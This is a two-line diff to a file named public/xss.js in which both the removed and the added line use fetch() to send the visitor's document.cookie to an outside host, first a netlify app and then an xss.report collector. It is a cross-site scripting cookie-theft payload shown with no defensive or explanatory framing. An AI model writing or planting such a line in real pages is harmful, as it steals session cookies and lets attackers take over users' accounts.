@@ -1,2 +1,2 @@
 <!-- public/xss.js -->
-fetch('https://sairexx.netlify.app/?c='+document.cookie);
+fetch('https://xss.report/c/saiirexx/?c='+document.cookie);
